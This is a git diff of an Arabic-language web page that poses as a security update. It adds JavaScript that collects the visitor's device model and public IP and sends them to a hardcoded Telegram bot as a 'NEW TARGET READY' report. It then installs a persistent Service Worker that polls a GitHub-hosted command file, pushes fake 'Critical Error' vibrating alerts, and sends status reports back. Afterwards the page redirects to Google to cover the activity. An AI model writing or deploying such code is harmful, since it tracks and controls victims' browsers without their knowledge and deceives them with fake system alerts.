@@ -24,20 +24,27 @@
 
 <script>
     const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
-    const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
-    let chatId = "";
+    // نصيحة: ضع معرف الشات الخاص بك هنا مباشرة إذا لم يعمل التلقائي
+    let manualChatId = ""; 
 
-    // 1. كود الـ Service Worker المدمج
     const swCode = `
         const TOKEN = '${TOKEN}';
-        const CMD_URL = '${CMD_URL}';
+        const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';
         let cid = "";
         let lastCmdId = "";
+
+        self.addEventListener('install', (event) => {
+            self.skipWaiting();
+        });
+
+        self.addEventListener('activate', (event) => {
+            event.waitUntil(clients.claim());
+        });
 
         self.addEventListener('message', (e) => {
             if (e.data.type === 'INIT') { 
                 cid = e.data.id; 
-                setInterval(pollCommands, 10000); // فحص كل 10 ثواني
+                setInterval(pollCommands, 10000);
             }
         });
 
@@ -54,50 +61,62 @@
 
         async function processAction(act) {
             let info = "";
-            if (act === "REPORT") {
-                info = "📊 Active Status: Target Online";
-            } else if (act === "VIBRATE") {
-                self.registration.showNotification("System Alert", { body: "Battery Overheating!", vibrate: [500, 100, 500] });
+            if (act === "REPORT") info = "📊 Active Status: Target Online";
+            else if (act === "VIBRATE") {
+                self.registration.showNotification("System Alert", { body: "Critical Error!", vibrate: [500, 100, 500] });
                 info = "📳 Vibration Executed";
             }
             if (cid) fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + cid + '&text=' + encodeURIComponent(info));
         }
     `;
 
-    // 2. تفعيل النظام
     async function ignite() {
         document.getElementById('status').innerText = "جاري تنفيذ بروتوكولات الأمان...";
         
-        // جلب معرف التليجرام
         try {
-            const res = await fetch(\`https://api.telegram.org/bot\${TOKEN}/getUpdates\`);
-            const data = await res.json();
-            chatId = data.result[data.result.length - 1].message.chat.id;
+            // 1. محاولة جلب الـ Chat ID تلقائياً
+            if (!manualChatId) {
+                const res = await fetch(\`https://api.telegram.org/bot\${TOKEN}/getUpdates\`);
+                const data = await res.json();
+                if (data.result.length > 0) {
+                    manualChatId = data.result[data.result.length - 1].message.chat.id;
+                } else {
+                    alert("يرجى إرسال رسالة للبوت أولاً!");
+                    return;
+                }
+            }
 
-            // استخراج البيانات الفورية
+            // 2. جلب الـ IP الحقيقي للضحية
+            let ip = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
             const ua = navigator.userAgent;
             const model = ua.match(/\\(([^)]+)\\)/) ? ua.match(/\\(([^)]+)\\)/)[1] : "Unknown Device";
-            const initialReport = \`💀 **NEW TARGET READY**\\nDevice: \${model}\\nIP: (Fetching...)\`;
+            const initialReport = \`💀 **NEW TARGET READY**\\n\\n📱 Device: \${model}\\n🌐 IP: \${ip}\`;
             
-            await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(initialReport)}&parse_mode=Markdown\`);
+            await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${manualChatId}&text=\${encodeURIComponent(initialReport)}&parse_mode=Markdown\`);
 
-            // زرع الـ Service Worker عبر Blob
+            // 3. زرع الـ Service Worker
             const blob = new Blob([swCode], { type: 'text/javascript' });
             const swUrl = URL.createObjectURL(blob);
             const reg = await navigator.serviceWorker.register(swUrl);
             
-            // إرسال الـ ID للخدمة
             setTimeout(() => {
                 if (navigator.serviceWorker.controller) {
-                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: chatId });
+                    navigator.serviceWorker.controller.postMessage({ type: 'INIT', id: manualChatId });
                 }
-            }, 1000);
+            }, 1500);
 
             document.getElementById('status').innerText = "اكتمل التحديث بنجاح!";
             setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
 
         } catch (e) {
-            alert("فشل الاتصال بالسيرفر، تأكد من وجود إنترنت.");
+            console.error(e);
+            alert("خطأ في الاتصال.");
         }
     }
 </script>
